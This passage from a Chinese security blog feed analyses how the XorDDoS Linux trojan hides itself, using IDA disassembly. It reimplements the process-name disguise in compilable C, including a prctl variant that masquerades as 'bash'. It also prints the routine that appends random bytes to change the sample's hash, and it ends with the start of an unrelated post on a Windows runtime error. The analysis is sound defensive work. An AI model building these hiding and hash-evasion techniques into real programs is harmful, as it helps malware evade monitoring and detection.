daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804BA4A                 mov     [esp+4], eax</span><br><span class="line">.text:0804BA4E                 lea     eax, [ebp+var_1C88]</span><br><span class="line">.text:0804BA54                 mov     [esp], eax</span><br><span class="line">.text:0804BA57                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure><p>都是作为LinuxExec_Argv2 参数使用的，接着来看LinuxExec_Argv2 的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.text:08048520 LinuxExec_Argv2 proc near               ; CODE XREF: DelService+B3p</span><br><span class="line">.text:08048520                                         ; DelService+CBlp ...</span><br><span class="line">.text:08048520</span><br><span class="line">.text:08048520 argv            = dword ptr -18h</span><br><span class="line">.text:08048520 var_14          = dword ptr -14h</span><br><span class="line">.text:08048520 var_10          = dword ptr -10h</span><br><span class="line">.text:08048520 var_C           = dword ptr -0Ch</span><br><span class="line">.text:08048520 var_8           = dword ptr -8</span><br><span class="line">.text:08048520 var_4           = dword ptr -4</span><br><span class="line">.text:08048520 file            = dword ptr  8</span><br><span class="line">.text:08048520 arg_4           = dword ptr  0Ch</span><br><span class="line">.text:08048520 arg_8           = dword ptr  10h</span><br><span class="line">.text:08048520</span><br><span class="line">.text:08048520                 push    ebp</span><br><span class="line">.text:08048521                 mov     ebp, esp</span><br><span class="line">.text:08048523                 sub     esp, 28h</span><br><span class="line">.text:08048526                 mov     [ebp+var_4], esi</span><br><span class="line">.text:08048529                 mov     esi, [ebp+file]</span><br><span class="line">.text:0804852C                 mov     [ebp+var_8], ebx</span><br><span class="line">.text:0804852F                 mov     [ebp+argv], 0</span><br><span class="line">.text:08048536                 mov     [ebp+var_14], 0</span><br><span class="line">.text:0804853D                 mov     [ebp+var_10], 0</span><br><span class="line">.text:08048544                 mov     [ebp+var_C], 0</span><br><span class="line">.text:0804854B                 call    doublefork</span><br><span class="line">.text:08048550                 test    eax, eax</span><br><span class="line">.text:08048552                 jz      short ZERO</span><br><span class="line">.text:08048554                 mov     ebx, [ebp+var_8]</span><br><span class="line">.text:08048557                 mov     esi, [ebp+var_4]</span><br><span class="line">.text:0804855A                 mov     esp, ebp</span><br><span class="line">.text:0804855C                 pop     ebp</span><br><span class="line">.text:0804855D                 retn</span><br><span class="line">.text:0804855E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804855E</span><br><span class="line">.text:0804855E ZERO:                                   ; CODE XREF: LinuxExec_Argv2+32j</span><br><span class="line">.text:0804855E                 mov     ebx, 3</span><br><span class="line">.text:08048563</span><br><span class="line">.text:08048563 LOOP:                                   ; CODE XREF: LinuxExec_Argv2+54j</span><br><span class="line">.text:08048563                 mov     [esp], ebx      ; fd</span><br><span class="line">.text:08048566                 add     ebx, 1</span><br><span class="line">.text:08048569                 call    close</span><br><span class="line">.text:0804856E                 cmp     ebx, 400h       ；400h == 1024</span><br><span class="line">.text:08048574                 jnz     short LOOP</span><br><span class="line">.text:08048576                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line">.text:0804857C                 mov     [esp], esi      ; file</span><br><span class="line">.text:0804857F                 mov     [ebp+var_14], eax</span><br><span class="line">.text:08048582                 mov     eax, [ebp+arg_8]；eax = pid</span><br><span class="line">.text:08048585                 mov     [ebp+var_10], eax</span><br><span class="line">.text:08048588                 lea     eax, [ebp+argv]</span><br><span class="line">.text:0804858B                 mov     [esp+4], eax    ; argv</span><br><span class="line">.text:0804858F                 call    execvp</span><br><span class="line">.text:08048594                 mov     dword ptr [esp], 0 ; status</span><br><span class="line">.text:0804859B                 call    exit</span><br><span class="line">.text:0804859B LinuxExec_Argv2 endp</span><br></pre></td></tr></table></figure><p>LinuxExec_Argv2 有三个参数。最终执行了execvp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0804857C                 mov     [esp], esi      ; file </span><br><span class="line">...</span><br><span class="line">.text:0804858B                 mov     [esp+4], eax    ; argv</span><br><span class="line">.text:0804858F                 call    execvp</span><br></pre></td></tr></table></figure><p>伪代码为，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execvp(file, &amp;argv);</span><br></pre></td></tr></table></figure><p>file 就是arg_0, 需要分析argv， 调出栈图就比较清晰了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            dd ?                    ; offset</span><br><span class="line">-00000014 var_14          dd ?</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先是这句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:08048529                 mov     esi, [ebp+file]</span><br><span class="line">...</span><br><span class="line">.text:0804852F                 mov     [ebp+argv], 0</span><br><span class="line">...</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                       ; offset</span><br><span class="line">-00000014 var_14          dd ?</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br></pre></td></tr></table></figure><p>再看这几句代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048576                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line">...</span><br><span class="line">.text:0804857F                 mov     [ebp+var_14], eax</span><br></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                   ; offset</span><br><span class="line">-00000014 var_14          arg_4</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br></pre></td></tr></table></figure><p>接下来是这几句代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048582                 mov     eax, [ebp+arg_8]；eax = pid</span><br><span class="line">.text:08048585                 mov     [ebp+var_10], eax</span><br></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                   ; offset</span><br><span class="line">-00000014 var_14          arg_4</span><br><span class="line">-00000010 var_10          arg_8</span><br><span class="line">-0000000C var_C           0</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>main函数中对LinuxExec_Argv2 的调用的为代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinuxExec_Argv2(&#x27;木马路径&#x27;, &#x27;伪装命令行&#x27;, pid);</span><br></pre></td></tr></table></figure><p>因此最后调用的execvp的伪代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execvp(&#x27;木马路径&#x27;, argv);</span><br></pre></td></tr></table></figure><p>将进入 main 函数参数个数为3的流程，用IDA重命名后，关键代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">text:0804B5D3 PARAM_NUM_3:                            ; CODE XREF: main+3CDj</span><br><span class="line"></span><br><span class="line">.text:0804B5D3                 lea     eax, [ebp+var_18]</span><br><span class="line">.text:0804B5D6                 mov     [esp+4], eax</span><br><span class="line">.text:0804B5DA                 lea     eax, [ebp+self_path]</span><br><span class="line">.text:0804B5E0                 mov     [esp], eax</span><br><span class="line">.text:0804B5E3                 call    readfile</span><br><span class="line">.text:0804B5E8                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B5EE                 mov     ebx, [edx+4]</span><br><span class="line">.text:0804B5F1                 mov     [ebp+self_file_content], eax</span><br><span class="line">.text:0804B5F7                 mov     [esp], ebx</span><br><span class="line">.text:0804B5FA                 call    strlen</span><br><span class="line">.text:0804B5FF                 mov     [esp+4], ebx</span><br><span class="line">.text:0804B603                 mov     [esp+8], eax</span><br><span class="line">.text:0804B607                 lea     eax, [ebp+fake_cmd]</span><br><span class="line">.text:0804B60D                 mov     [esp], eax</span><br><span class="line">.text:0804B610                 call    memmove</span><br><span class="line">.text:0804B615                 mov     dword ptr [esp+0Ch], 0</span><br><span class="line">.text:0804B61D                 mov     dword ptr [esp+8], 0Ah</span><br><span class="line">.text:0804B625                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B62D                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B633                 mov     eax, [edx+8]</span><br><span class="line">.text:0804B636                 mov     [esp], eax</span><br><span class="line">.text:0804B639                 call    __strtol_internal</span><br><span class="line">.text:0804B63E                 mov     esi, eax</span><br><span class="line">.text:0804B640                 mov     eax, [ebp+argv_arr]</span><br><span class="line">.text:0804B646                 mov     ebx, [eax]</span><br><span class="line">.text:0804B648                 mov     [esp], ebx</span><br><span class="line">.text:0804B64B                 call    strlen</span><br><span class="line">.text:0804B650                 mov     [esp], ebx</span><br><span class="line">.text:0804B653                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B65B                 mov     [esp+8], eax</span><br><span class="line">.text:0804B65F                 call    memset</span><br><span class="line">.text:0804B664                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B66A                 mov     ebx, [edx+4]</span><br><span class="line">.text:0804B66D                 mov     [esp], ebx</span><br><span class="line">.text:0804B670                 call    strlen</span><br><span class="line">.text:0804B675                 mov     [esp], ebx</span><br><span class="line">.text:0804B678                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B680                 mov     [esp+8], eax</span><br><span class="line">.text:0804B684                 call    memset</span><br><span class="line">.text:0804B689                 mov     eax, [ebp+argv_arr]</span><br><span class="line">.text:0804B68F                 mov     ebx, [eax+8]</span><br><span class="line">.text:0804B692                 mov     [esp], ebx</span><br><span class="line">.text:0804B695                 call    strlen</span><br><span class="line">.text:0804B69A                 mov     [esp], ebx</span><br><span class="line">.text:0804B69D                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B6A5                 mov     [esp+8], eax</span><br><span class="line">.text:0804B6A9                 call    memset</span><br><span class="line">.text:0804B6AE                 lea     edx, [ebp+fake_cmd]</span><br><span class="line">.text:0804B6B4                 mov     [esp+4], edx</span><br><span class="line">.text:0804B6B8                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B6BE                 mov     eax, [edx]</span><br><span class="line">.text:0804B6C0                 mov     [esp], eax</span><br><span class="line">.text:0804B6C3                 call    strcpy</span><br><span class="line">.text:0804B6C8                 lea     eax, [ebp+filename]</span><br><span class="line">.text:0804B6CE                 mov     [esp+0Ch], esi</span><br><span class="line">.text:0804B6D2                 lea     esi, [ebp+randstr_10]</span><br></pre></td></tr></table></figure><p>上面代码的原理大致等同于下面这段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> fake_cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_cmd, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="type">char</span> * argv_arr_1 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> argv_arr_1_length = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);</span><br><span class="line">    <span class="type">long</span> pid_long = strtol(argv[<span class="number">2</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="type">char</span> * v29 = (<span class="type">char</span> *)*argv;</span><br><span class="line">    <span class="type">int</span> v30 = <span class="built_in">strlen</span>(*argv);</span><br><span class="line">    <span class="built_in">memset</span>(v29, <span class="number">0</span>, v30);</span><br><span class="line">    <span class="type">char</span> * v31 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> v32 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, v32);</span><br><span class="line">    <span class="type">char</span> * v33 = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> v34 = <span class="built_in">strlen</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v33, <span class="number">0</span>, v34);</span><br><span class="line">    <span class="built_in">strcpy</span>(*argv, fake_cmd);</span><br><span class="line">    sleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译后执行可以看到效果和运行样本的一样。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -o fakeexe exe.c</span><br><span class="line">➜  ~ ./fakeexe <span class="string">&quot;ls -al&quot;</span> 2554</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /proc/2605/cmdline</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">ls</span> -l /proc/2605/exe</span><br><span class="line">lrwxrwxrwx. 1 henices henices 0 8月   2 12:01 /proc/2605/exe -&gt; /home/henices/research/xorddos/fakeexe</span><br><span class="line"></span><br><span class="line">➜  ~ ps -elf | grep <span class="string">&quot;ls -al&quot;</span> | grep -v grep</span><br><span class="line">0 S henices   2605 25307  0  80   0 -  1043 hrtime 12:01 pts/5    00:00:00 <span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure><p>其实效果并不好，可以轻易发现踪迹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps -e | grep fakeexe</span><br><span class="line"> 2605 pts/9    00:00:00 fakeexe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实有更好的做法，使用 prctl ，至少可以把ps给搞定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> fake_cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_cmd, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="type">char</span> * argv_arr_1 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> argv_arr_1_length = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);</span><br><span class="line">    <span class="type">long</span> pid_long = strtol(argv[<span class="number">2</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="type">char</span> * v29 = (<span class="type">char</span> *)*argv;</span><br><span class="line">    <span class="type">int</span> v30 = <span class="built_in">strlen</span>(*argv);</span><br><span class="line">    <span class="built_in">memset</span>(v29, <span class="number">0</span>, v30);</span><br><span class="line">    <span class="type">char</span> * v31 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> v32 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, v32);</span><br><span class="line">    <span class="type">char</span> * v33 = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> v34 = <span class="built_in">strlen</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v33, <span class="number">0</span>, v34);</span><br><span class="line">    <span class="built_in">strcpy</span>(*argv, fake_cmd);</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;bash&quot;</span>);</span><br><span class="line">    sleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译执行后可以看到效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps -e | grep bash</span><br><span class="line"> 4858 pts/5    00:00:00 bash</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /proc/4858/cmdline </span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"></span><br><span class="line">➜  ~ lsof -d txt | grep fakeexe</span><br><span class="line">bash       4858 henices txt       REG  253,2      8816  4588423 /home/henices/research/xorddos/fakeexe</span><br></pre></td></tr></table></figure><h2 id="xorddos-的多态-（Polymorphic）"><a href="#xorddos-的多态-（Polymorphic）" class="headerlink" title="xorddos 的多态 （Polymorphic）"></a>xorddos 的多态 （Polymorphic）</h2><p>xorddos这个样本还值得一提的是，这个样本会不断变化，多态这个词翻译的可能不太准确，<br>可以参见上面的英文，自行理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">randmd5</span><span class="params">(<span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="type">int</span> fd_dup; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="type">mode_t</span> v4; <span class="comment">// [sp+8h] [bp-20h]@0</span></span><br><span class="line">  <span class="type">int</span> addr; <span class="comment">// [sp+15h] [bp-13h]@1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+19h] [bp-Fh]@1</span></span><br><span class="line">  __int16 v7; <span class="comment">// [sp+1Dh] [bp-Bh]@1</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [sp+1Fh] [bp-9h]@1</span></span><br><span class="line"></span><br><span class="line">  addr = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  fd = open(filename, <span class="number">1</span>, v4);</span><br><span class="line">  fd_dup = fd;</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    randstr((<span class="type">int</span>)&amp;addr, <span class="number">10</span>);</span><br><span class="line">    write(fd_dup, &amp;addr, <span class="number">11u</span>);</span><br><span class="line">    close(fd_dup);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xorddos 样本多态主要就是用这个函数，每次在文件末尾写上10个字节的随机字符。<br>这样样本md5和大小都会发生变化，使得一些检测方法失效。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>正因为这种隐藏方法并不理想，后面xorddos出现了带rootkit的版本，进化了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;进程隐藏&quot;&gt;&lt;a href=&quot;#进程隐藏&quot; class=&quot;headerlink&quot; title=&quot;进程隐藏&quot;&gt;&lt;/a&gt;进程隐藏&lt;/h2&gt;&lt;p&gt;上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，&lt;br&gt;变种也很多，拿到的样本比较有趣的是 </summary>
      
    
    
    
    
    <category term="Malware" scheme="http://usmacd.com/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>解决 Windows Rx034</title>
    <link href="http://usmacd.com/cn/Windows_Rx034/"/>
    <id>http://usmacd.com/cn/Windows_Rx034/</id>
    <published>2023-09-06T03:00:51.914Z</published>
    <updated>2023-09-06T03:00:51.914Z</updated>
    
    <content type="html"><![CDATA[<p>以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图：</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/r5051.png" alt="error"></p><p>先放狗搜一下，微软的对R6034的解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">An application has made an attempt to load the C runtime library without using</span><br><span class="line">a manifest. This is an unsupported way to load Visual C++ DLLs. You need to</span><br><span class="line">modify your application to build with a manifest. For more information, see the</span><br><span class="line">&quot;Visual C++ Libraries as Shared Side-by-Side Assemblies&quot; topic in the product</span><br><span class="line">documentation.</span><br></pre></td></tr></table></figure><p>微软的链接中也提到了解决的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rebuild your application to include a manifest. Building an application with</span><br><span class="line">Visual Studio automatically puts the manifest into the resulting .exe or .dll</span><br><span class="line">file. If you are building at the command line, use the mt.exe tool to add the</span><br><span class="line">manifest as a resource. Use 